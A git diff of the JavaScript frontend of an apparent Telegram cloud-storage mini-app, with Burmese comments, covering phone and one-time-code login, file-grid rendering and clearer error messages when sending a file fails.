@@ -11,7 +11,6 @@ const BACKEND_URL = "https://telegramcloudbackend.onrender.com";
 let phoneHash = "", userPhone = "", pollingInterval, allFilesData = [];
 let tgUser = tg.initDataUnsafe?.user;
 
-// 💡 ယာယီနာမည်အစား Real User ID ကို အသုံးပြုနိုင်ရန် ပြင်ဆင်ခြင်း
 let userName = tgUser && tgUser.id ? tgUser.id.toString() : (localStorage.getItem("temp_uid") || "Web_Cloud_User_" + Math.floor(Math.random() * 1000000));
 
 function switchStep(stepId) {
@@ -77,7 +76,7 @@ function handleMobileContact() {
             switchStep("step-loading");
             pollingInterval = setInterval(() => checkContactReceived(userId), 2000);
             
-            // 💡 Timeout ကို စက္ကန့် ၉၀ ထိပေးထားသဖြင့် Server Sleep နေပါကလည်း ပြဿနာမရှိတော့ပါ
+            // 💡 Server Sleep မှ ပြန်နိုးရန် အချိန်ပေးထားပါသည်
             setTimeout(() => {
                 if(pollingInterval) {
                     clearInterval(pollingInterval);
@@ -129,7 +128,6 @@ async function verifyOTP() {
         let res = await fetch(`${BACKEND_URL}/api/verify_code`, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ phone: userPhone, code: code, hash: phoneHash, name: userName }) });
         let result = await res.json();
         if(result.success) {
-            // 💡 Login ဝင်ပြီးသည်နှင့် Real User ID သို့ ပြောင်းလဲမှတ်သားမည်
             if(result.real_user_id) {
                 userName = result.real_user_id;
                 localStorage.setItem("temp_uid", userName);
@@ -262,7 +260,7 @@ function renderFilesGrid(files) {
                 }
 
                 html += `
-                <div class="file-card" onclick="openFile('${f.id}', '${f.type}', '${safeTitle}')">
+                <div class="file-card" onclick="openFile('${f.id}')">
                     ${thumbHtml}
                     <div class="fc-title">${displayTitle}</div>
                     <div class="fc-meta">${f.size || dateStr}</div>
@@ -342,10 +340,11 @@ async function openFile(msgId) {
             tg.HapticFeedback.notificationOccurred("success");
             showToast("<i class='fa-solid fa-check mr-2'></i> Ready! Swipe down app to view.", "success");
         } else {
+            // 💡 Error 2 Fix: ပို့မရပါက Telegram ရဲ့ တကယ့် Error ကို UI မှာ ပြပေးပါမည်
             if (result.message && result.message.includes("Session Terminated")) {
                 showAlert(result.message, "Logged Out", () => window.location.reload());
             } else {
-                showToast("<i class='fa-solid fa-xmark mr-2'></i> Failed to send.", "error");
+                showToast("<i class='fa-solid fa-xmark mr-2'></i> " + (result.message || "Failed to send."), "error");
             }
         }
     } catch(e) { showToast("Connection error.", "error"); }
